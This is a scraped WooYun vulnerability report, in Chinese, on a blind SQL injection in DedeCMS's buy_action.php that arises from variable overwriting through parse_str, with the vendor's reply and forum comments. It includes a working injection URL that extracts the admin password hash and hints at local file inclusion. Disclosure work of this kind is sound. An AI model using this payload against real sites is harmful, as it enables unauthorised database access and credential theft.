{"id": 3872, "wybug_id": "wooyun-2014-052685", "wybug_title": "DedeCMS某全版本通杀SQL注入（续）", "wybug_corp": "Dedecms", "wybug_author": "kobin97", "wybug_date": "2014-03-03 21:30", "wybug_open_date": "2014-06-01 21:31", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向公众公开  简要描述： 0x00 前言不可否认，官方应对安全漏洞的能力以及这次发布的安全补丁也是十分的失败的！大家再回来看看：http://www.wooyun.org/bugs/wooyun-2014-051889 （文章：http://drops.wooyun.org/papers/979） 分析，确实是很黄很暴力！但：大家再看看，造成这次漏洞的原因是加密太简单？分析这个漏洞的人也是傻眼了吧？补丁是否能真正解决问题？下面我们来分析下看看。 详细说明：  0x01 漏洞分析回头看buy_action.php 这个文件（修复版）。代码 25行\nparse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);    foreach($mch_Post as $k => $v) $$k = $v;\n很明显，造成这次漏洞的原因是变更覆盖。但官方修复却是 加强mchStrCode函数的加密强度。我们再看调用：mchStrCode 的地方同文件的 112 行\n$pr_encode = '';    foreach($_REQUEST as $key => $val)    {        $pr_encode .= $pr_encode ? \"&$key=$val\" : \"$key=$val\";    }        $pr_encode = str_replace('=', '', mchStrCode($pr_encode));\n傻了，这 $key 和 $val 都可以控制呀。。如果可以直接传入GLOBALS[cfg_dbprefix] 不就可以造成变量覆盖了吗？但了解dede的人都知道，在文件：include/common.inc.php 有全局过滤 GLOBALS 开头键、值的过滤函数，绕过这个好像比较登天还要难吧!但实际上，&$key=$val 这样的拼接，还可以值里输入  &a=x 这样的呀，解释后不就可以利用了么？0x02 漏洞测试此处是一个盲注，为了测试方便，我们直接修复执行语句的文件，打印出执行的语句：echo $this->queryString.\"<br>\";http://localhost/member/buy_action.php?POSTpid=1&product=card&a=b%26GLOBALS[cfg_dbprefix]=dede_member_operation where mid=9999 or @`'` or (ascii(substring((select pwd from dede_admin limit 0,1),1,1))=97)#%26product=@`'`注意到 %26  即 &\n\n然后点击购买并支付\n\n可以看到语句被成功地注入到查询中。根据回应不同，我们可以盲注成数据库中的数据。0x03 漏洞深入分析128行\n$rs = $dsql->GetOne(\"SELECT * FROM `#@__payment` WHERE id='$paytype' \");    require_once DEDEINC.'/payment/'.$rs['code'].'.php';\n如果覆盖变量 $paytype ，可以造成本地文件包含？通过包含文件是否就能拿shell了？不难发现 parse_str 受GPC控制，利用条件也就是GPC OFF测试之\n\n拿shell方法暂不研究了，有兴趣的可以继续。0x04 总结有时漏洞点一个，但利用方式很多，把主要造成漏洞的地方修复了，才是真正的修复，而不是看别人指那就修复那。   漏洞证明：  上面已经包含证明过程   修复方案：  变量覆盖的地方。   版权声明：转载请注明来源 kobin97@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-03-04 12:19 厂商回复： 感谢反馈，已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-03 21:31 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  前排围观    \n     2014-03-03 21:32 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  Mark!前台火速留名，二楼卖水表！    \n     2014-03-03 21:33 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  前排卖摔炮    \n     2014-03-03 21:35 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  厉害啊！    \n     2014-03-03 21:38 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  厉害啊！    \n     2014-03-03 21:42 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  不是一次修复了2个吗，还有类似的？    \n     2014-03-03 21:58 |    \t\ttnt1200 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 关注飞机安全....)\t\t \n  火钳刘明    \n     2014-03-03 21:58 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  关注下wooyun老大    \n     2014-03-03 22:13 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  mark    \n     2014-03-03 22:16 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  前排围观。    \n     2014-03-03 22:36 |    \t\t07@jyhack.com \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | 希望和大家多多交流，多多沟通、)\t\t \n  织梦这是要火的节奏。。。    \n     2014-03-03 22:54 |    \t\t高斯 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  DeDe火了！    \n     2014-03-03 22:56 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  老大你是要火了一把又一把么     \n     2014-03-03 23:08 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  看到补丁中的$GLOBALS['cfg_cookie_encode']经过了3次MD5就没跟了，哈哈    \n     2014-03-03 23:19 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  这个补丁。。。细心&NB的黑阔伤不起    \n     2014-03-03 23:28 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @niliu 抢生意啊    \n     2014-03-04 00:48 |    \t\t星光 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 路途行踪的小白)\t\t \n  抱大腿    \n     2014-03-04 02:43 |    \t\tLet a person cry. \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:9        | xxoo)\t\t \n  果断火的节奏..来私聊发下，又去撸一圈    \n     2014-03-04 08:36 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @zzR 后排生意也不错    \n     2014-03-04 09:03 |    \t\t银狼_avi \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:13        | 本屌十二岁破处)\t\t \n  mark     \n     2014-03-04 09:12 |    \t\t假面， \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 我是一个小小小小小sb~)\t\t \n  - -.这织梦真的会被玩死。。    \n     2014-03-04 09:44 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  顶    \n     2014-03-04 09:50 |    \t\tC4nf3ng \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:5        )\t\t \n  mark    \n     2014-03-04 17:14 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  坐等第三次绕过    \n     2014-03-07 12:39 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  果然是一样的～～ 洞主v5     \n     2014-03-08 02:09 |    \t\t小东丶 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 淫荡的思想。)\t\t \n  又出洞？    \n     2014-04-13 03:23 |    \t\t二少 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | xxxxx)\t\t \n  这个洞出自哪个文件？    \n     2014-06-02 08:46 |    \t\tieasyi \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  今年上半年SQL注射入明星厂商啊。这绝对是要火的节奏。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}